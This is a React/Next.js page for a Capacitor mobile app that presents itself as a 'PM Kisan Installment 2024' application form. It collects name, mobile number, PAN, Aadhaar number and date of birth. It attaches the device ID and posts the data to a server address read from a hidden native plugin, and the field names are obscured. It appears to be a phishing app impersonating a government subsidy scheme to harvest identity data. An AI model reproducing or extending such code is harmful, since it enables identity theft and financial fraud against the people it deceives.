"use client";
import 'globalthis/auto';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";
import { useState } from "react";
import styles from "../mycss.module.css";
import Echo from "../registerPlugin";
import { Device } from '@capacitor/device';
import DateInputComponent from "../inlcude/DateInputComponent";
import Loader from "../inlcude/Loader";

export default function Home() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    localStorage.removeItem("collection_id");
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
  
    try {
      
      const result = await Echo.getConfig();
      const API_URL = result.value;
      const SITE = result.site;

      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
  
      formData.forEach((value, key) => {
        jsonObject[key] = value;  
      });
  
      jsonObject1["data"] = jsonObject;
      jsonObject1["site"] = SITE;
      jsonObject1['mobile_id'] = (await Device.getId()).identifier;

      const response = await fetch(`${API_URL}/form/add`, {
        method: "POST",
        body: JSON.stringify(jsonObject1),
      });
  
      const responseData = await response.json();

      if (responseData.status === 200) {
        localStorage.setItem("collection_id", responseData.data);
        router.push("/end");
      } else {
        alert(responseData.msg); 
        setLoading(false);  
      }
    } catch (error) {
      console.error("Error calling Echo plugin or API:", error);
      alert("An error occurred, please try again."+error);
    } finally {
      setLoading(false);  
    }
  };

  return (
    <>
      <Header />
      <main className="container">
        <div className="m-2 card-box card ">
          <div className={`${styles.bgPrimary} text-white text-center`}>
            <h3 className='text-center'>Apply Now <br /> PM Kisan Installment 2024</h3>
          </div>
          <form onSubmit={handleSubmit} id="submitForm" className='p-3 bgPrimary2'>
          
          <div className="row mb-3">
            <div className="col-sm-10">
              <input type="text" placeholder='Enter Your Name' name="entername" className={`form-control ${styles.formControl}`} required/>
            </div>
          </div>
              
          <div className="row mb-3">
            <div className="col-sm-10">
              <input type="text" inputMode='numeric' maxLength={10} minLength={10} placeholder='Enter Mobile Number' name="enternumm" className={`form-control ${styles.formControl}`} required />
            </div>
          </div>
          <div className="row mb-3">
            <div className="col-sm-10">
              <input type="text" pattern='^[A-Za-z]{5}\d{4}[A-Za-z]{1}$' placeholder='Enter Pan Card Number' maxLength={10} minLength={10} name="numpn" className={`form-control ${styles.formControl}`} required />
            </div>
          </div>

          <div className="row mb-3">
            <div className="col-sm-10">
              <input type="text" inputMode='numeric' placeholder='Enter Aadhaar Number' maxLength={12} minLength={12} name="numah" className={`form-control ${styles.formControl}`} required/>
            </div>
          </div>

          <DateInputComponent />

        

            <div className="d-flex w-100 justify-content-center">
              <button
                type="submit"
                className={`btn px-4 w-100 text-white ${styles.bgPrimary3} mt-3 text-center`}
                id="submit-button"
                disabled={loading}
              >
                {loading ? "Please wait..." : "Continue"}
              </button>
            </div>
          </form>
        </div>
      </main>
      <Footer />
    </>
  );
}
